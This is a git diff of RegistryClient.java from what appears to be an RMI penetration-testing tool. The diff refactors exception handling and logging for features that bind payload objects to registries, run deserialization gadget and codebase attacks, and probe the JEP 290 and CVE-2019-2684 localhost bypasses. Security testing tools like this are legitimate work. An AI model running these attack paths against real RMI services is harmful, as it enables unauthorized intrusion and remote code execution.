@@ -6,9 +6,12 @@ import javax.management.remote.rmi.RMIServerImpl_Stub;
 
 import de.qtc.rmg.internal.ExceptionHandler;
 import de.qtc.rmg.internal.MethodArguments;
+import de.qtc.rmg.internal.RMGOption;
+import de.qtc.rmg.internal.RMIComponent;
 import de.qtc.rmg.io.Logger;
 import de.qtc.rmg.io.MaliciousOutputStream;
-import de.qtc.rmg.networking.RMIWhisperer;
+import de.qtc.rmg.networking.RMIEndpoint;
+import de.qtc.rmg.utils.RMGUtils;
 import de.qtc.rmg.utils.YsoIntegration;
 import sun.rmi.server.UnicastRef;
 import sun.rmi.transport.LiveRef;
@@ -40,13 +43,13 @@ import sun.rmi.transport.tcp.TCPEndpoint;
 @SuppressWarnings("restriction")
 public class RegistryClient {
 
-    private RMIWhisperer rmi;
+    private RMIEndpoint rmi;
 
     private static final long interfaceHash = 4905912898345647071L;
     private static final ObjID objID = new ObjID(ObjID.REGISTRY_ID);
 
 
-    public RegistryClient(RMIWhisperer rmiEndpoint)
+    public RegistryClient(RMIEndpoint rmiEndpoint)
     {
         this.rmi = rmiEndpoint;
     }
@@ -68,9 +71,11 @@ public class RegistryClient {
      */
     public void bindObject(String boundName, Object payloadObject, boolean localhostBypass)
     {
+        String className = payloadObject.getClass().getName();
+
         Logger.printMixedBlue("Binding name", boundName, "to ");
-        Logger.printlnPlainBlue(payloadObject.getClass().getName());
-        Logger.println("");
+        Logger.printlnPlainBlue(className);
+        Logger.lineBreak();
         Logger.increaseIndent();
 
         MethodArguments callArguments = new MethodArguments(2);
@@ -100,6 +105,12 @@ public class RegistryClient {
             } else if( t instanceof java.rmi.AlreadyBoundException) {
                 ExceptionHandler.alreadyBoundException(e, boundName);
 
+            } else if( t instanceof java.io.InvalidClassException) {
+                ExceptionHandler.invalidClassBind(e, "Bind", className);
+
+            } else if( t instanceof java.lang.UnsupportedOperationException ) {
+                ExceptionHandler.unsupportedOperationException(e, "bind");
+
             } else {
                 ExceptionHandler.unexpectedException(e, "bind", "call", false);
             }
@@ -122,9 +133,11 @@ public class RegistryClient {
      */
     public void rebindObject(String boundName, Object payloadObject, boolean localhostBypass)
     {
-        Logger.printMixedBlue("Binding name", boundName, "to ");
-        Logger.printlnPlainBlue(payloadObject.getClass().getName());
-        Logger.println("");
+        String className = payloadObject.getClass().getName();
+
+        Logger.printMixedBlue("Rebinding name", boundName, "to ");
+        Logger.printlnPlainBlue(className);
+        Logger.lineBreak();
         Logger.increaseIndent();
 
         MethodArguments callArguments = new MethodArguments(2);
@@ -151,6 +164,12 @@ public class RegistryClient {
                 Logger.eprintlnMixedBlue("But the class", "RMIServerImpl_Stub", "was not found.");
                 Logger.eprintln("The server probably runs on a JRE with limited module access.");
 
+            } else if( t instanceof java.io.InvalidClassException) {
+                ExceptionHandler.invalidClassBind(e, "Rebind", className);
+
+            } else if( t instanceof java.lang.UnsupportedOperationException ) {
+                ExceptionHandler.unsupportedOperationException(e, "rebind");
+
             } else {
                 ExceptionHandler.unexpectedException(e, "rebind", "call", false);
             }
@@ -169,8 +188,8 @@ public class RegistryClient {
      */
     public void unbindObject(String boundName, boolean localhostBypass)
     {
-        Logger.printlnMixedBlue("Ubinding bound name", boundName, "from the registry.");
-        Logger.println("");
+        Logger.printlnMixedBlue("Unbinding bound name", boundName, "from the registry.");
+        Logger.lineBreak();
         Logger.increaseIndent();
 
         MethodArguments callArguments = new MethodArguments(1);
@@ -228,12 +247,12 @@ public class RegistryClient {
     public void enumCodebase(boolean marshal, String regMethod, boolean localhostBypass)
     {
         Logger.printlnBlue("RMI server useCodebaseOnly enumeration:");
-        Logger.println("");
+        Logger.lineBreak();
         Logger.increaseIndent();
 
         if(!marshal && regMethod == "lookup") {
-            Logger.eprintlnMixedYellow("- RMI registry uses", "readString()", "for unmarshalling java.lang.String.");
-            Logger.eprintlnMixedBlue("  This prevents", "useCodebaseOnly", "enumeration from remote.");
+            Logger.printlnMixedYellow("- RMI registry uses", "readString()", "for unmarshalling java.lang.String.");
+            Logger.printlnMixedBlue("  This prevents", "useCodebaseOnly", "enumeration from remote.");
             Logger.decreaseIndent();
             return;
         }
@@ -265,6 +284,12 @@ public class RegistryClient {
             } else if( t instanceof java.rmi.AccessException && t.getMessage().contains("non-local host") ) {
                 Logger.eprintlnMixedYellow("Unable to enumerate useCodebaseOnly by using", regMethod, "call.");
                 ExceptionHandler.nonLocalhost(e, regMethod, localhostBypass);
+
+            } else if( t instanceof java.io.InvalidClassException) {
+                ExceptionHandler.invalidClassEnum(e, regMethod);
+
+            } else if( t instanceof java.lang.UnsupportedOperationException) {
+                ExceptionHandler.unsupportedOperationExceptionEnum(e, regMethod);
 
             } else {
                 ExceptionHandler.unexpectedException(e, regMethod, "call", false);
@@ -308,7 +333,7 @@ public class RegistryClient {
         boolean marshal = false;
 
         Logger.printlnBlue("RMI server String unmarshalling enumeration:");
-        Logger.println("");
+        Logger.lineBreak();
         Logger.increaseIndent();
 
         MethodArguments callArguments = new MethodArguments(1);
@@ -330,9 +355,19 @@ public class RegistryClient {
 
             } else if( t instanceof java.io.InvalidClassException ) {
                 Logger.printMixedBlue("- Server rejected deserialization of", "java.lang.Integer");
-                Logger.printlnPlainYellow(" (SingleEntryRegistry?).");
-                Logger.println("  --> Unable to detect String marshalling on this registry type.");
-                Logger.statusUndecided("Configuration");
+                Logger.printlnPlainYellow(" (JMX?)");
+                Logger.printMixedBlue("  --> The type", "java.lang.String", "is unmarshalled via ");
+                Logger.printlnPlainYellow("readObject().");
+                Logger.statusOutdated();
+                ExceptionHandler.showStackTrace(e);
+                marshal = true;
+
+            } else if( t instanceof java.lang.UnsupportedOperationException ) {
+                Logger.printMixedBlue("- Server rejected deserialization of", "java.lang.Integer", "with an");
+                Logger.printPlainYellow(" UnsupportedOperationException");
+                Logger.printlnPlainBlue(" (NotSoSerial?)");
+                Logger.printMixedBlue("  --> The type", "java.lang.String", "is unmarshalled via ");
+                Logger.printlnPlainYellow("readObject().");
                 ExceptionHandler.showStackTrace(e);
 
             } else if( t instanceof java.lang.ClassNotFoundException && t.getMessage().contains("DefinitelyNonExistingClass")) {
@@ -385,7 +420,7 @@ public class RegistryClient {
     public void enumLocalhostBypass()
     {
         Logger.printlnBlue("RMI registry localhost bypass enumeration (CVE-2019-2684):");
-        Logger.println("");
+        Logger.lineBreak();
         Logger.increaseIndent();
 
         MethodArguments callArguments = new MethodArguments(1);
@@ -393,13 +428,14 @@ public class RegistryClient {
 
         try {
             registryCall("unbind", callArguments, false, true);
+            ExceptionHandler.localhostBypassNoException();
 
         } catch( java.rmi.ServerException e ) {
 
             Throwable t = ExceptionHandler.getCause(e);
 
             if( t instanceof java.rmi.AccessException && t.getMessage().contains("non-local host") ) {
-                Logger.eprintlnMixedYellow("- Registry", "rejected unbind call", "cause it was not send from localhost.");
+                Logger.printlnMixedYellow("- Registry", "rejected unbind call", "cause it was not send from localhost.");
                 Logger.statusOk();
                 ExceptionHandler.showStackTrace(e);
 
@@ -440,14 +476,14 @@ public class RegistryClient {
     public void enumJEP290Bypass(String regMethod, boolean localhostBypass, boolean marshal)
     {
         Logger.printlnBlue("RMI registry JEP290 bypass enmeration:");
-        Logger.println("");
+        Logger.lineBreak();
         Logger.increaseIndent();
 
         Object payloadObject = null;
 
         if(!marshal && regMethod == "lookup") {
-            Logger.eprintlnMixedYellow("- RMI registry uses", "readString()", "for unmarshalling java.lang.String.");
-            Logger.eprintlnMixedBlue("  This prevents", "JEP 290 bypass", "enumeration from remote.");
+            Logger.printlnMixedYellow("- RMI registry uses", "readString()", "for unmarshalling java.lang.String.");
+            Logger.printlnMixedBlue("  This prevents", "JEP 290 bypass", "enumeration from remote.");
             Logger.decreaseIndent();
             return;
         }
@@ -476,6 +512,12 @@ public class RegistryClient {
                 Logger.printlnPlainYellow("(An Trinh bypass patched).");
                 ExceptionHandler.showStackTrace(e);
                 Logger.statusOk();
+
+            } else if( t instanceof java.io.InvalidClassException) {
+                ExceptionHandler.invalidClassEnum(e, regMethod);
+
+            } else if( t instanceof java.lang.UnsupportedOperationException) {
+                ExceptionHandler.unsupportedOperationExceptionEnum(e, regMethod);
 
             } else {
                 ExceptionHandler.unexpectedException(e, regMethod, "call", false);
@@ -509,33 +551,18 @@ public class RegistryClient {
 
             registryCall(regMethod, packArgsByName(regMethod, payloadObject), false, localhostBypass);
 
-        } catch( java.rmi.ServerException e ) {
+        } catch( Exception e ) {
 
             Throwable cause = ExceptionHandler.getCause(e);
 
-            if( cause instanceof java.io.InvalidClassException ) {
-                ExceptionHandler.jep290(e);
-
-            } else if( cause instanceof java.lang.ClassNotFoundException) {
-                ExceptionHandler.deserializeClassNotFound(e);
-
-            } else if( cause instanceof java.lang.ClassCastException) {
-                ExceptionHandler.deserlializeClassCast(e, regMethod.equals("lookup"));
-
-            } else if( cause instanceof java.rmi.RemoteException && cause.getMessage().contains("Method is not Remote")) {
+            if( cause instanceof java.rmi.RemoteException && cause.getMessage().contains("Method is not Remote")) {
                 Logger.printlnMixedYellow("Caught", "RemoteException", "during deserialization attack.");
                 Logger.printMixedBlue("This is expected when", "An Trinh bypass", "was used and the server ");
                 Logger.printlnPlainYellow("is patched.");
 
             } else {
-                ExceptionHandler.unknownDeserializationException(e);
+                ExceptionHandler.handleGadgetCallException(e, RMIComponent.REGISTRY, regMethod);
             }
-
-        } catch( java.lang.ClassCastException e ) {
-            ExceptionHandler.deserlializeClassCast(e, regMethod.equals("lookup"));
-
-        } catch( Exception e ) {
-            ExceptionHandler.unexpectedException(e, regMethod, "call", false);
         }
     }
 
@@ -555,39 +582,8 @@ public class RegistryClient {
         try {
             registryCall(regMethod, packArgsByName(regMethod, payloadObject), true, localhostBypass);
 
-        } catch( java.rmi.ServerException e ) {
-
-            Throwable cause = ExceptionHandler.getCause(e);
-
-            if( cause instanceof java.io.InvalidClassException ) {
-                ExceptionHandler.invalidClass(e, "Registry", className);
-                Logger.eprintlnMixedBlue("Make sure your payload class", "extends RemoteObject", "and try again.");
-                ExceptionHandler.showStackTrace(e);
-
-            } else if( cause instanceof java.lang.ClassFormatError || cause instanceof java.lang.UnsupportedClassVersionError) {
-                ExceptionHandler.unsupportedClassVersion(e, regMethod, "call");
-
-            } else if( cause instanceof java.lang.ClassNotFoundException && cause.getMessage().contains("RMI class loader disabled") ) {
-                ExceptionHandler.codebaseSecurityManager(e);
-
-            } else if( cause instanceof java.lang.ClassNotFoundException && cause.getMessage().contains(className)) {
-                ExceptionHandler.codebaseClassNotFound(e, className);
-
-            } else if( cause instanceof java.lang.ClassCastException) {
-                ExceptionHandler.codebaseClassCast(e, regMethod.equals("lookup"));
-
-            } else if( cause instanceof java.security.AccessControlException) {
-                ExceptionHandler.accessControl(e, regMethod, "call");
-
-            } else {
-                ExceptionHandler.unexpectedException(e, regMethod, "call", false);
-            }
-
-        } catch( java.lang.ClassCastException e ) {
-            ExceptionHandler.codebaseClassCast(e, regMethod.equals("lookup"));
-
         } catch( Exception e ) {
-            ExceptionHandler.unexpectedException(e, regMethod, "call", false);
+            ExceptionHandler.handleCodebaseException(e, className, RMIComponent.REGISTRY, regMethod);
         }
     }
 
@@ -713,8 +709,10 @@ public class RegistryClient {
      */
     public static Object prepareRMIServerImpl(String host, int port)
     {
+        ObjID objid = RMGOption.BIND_OBJID.notNull() ? RMGUtils.parseObjID(RMGOption.BIND_OBJID.getValue()) : new ObjID();
+
         TCPEndpoint endpoint = new TCPEndpoint(host, port);
-        UnicastRef refObject = new UnicastRef(new LiveRef(new ObjID(), endpoint, false));
+        UnicastRef refObject = new UnicastRef(new LiveRef(objid, endpoint, false));
         return new RMIServerImpl_Stub(refObject);
     }
 }
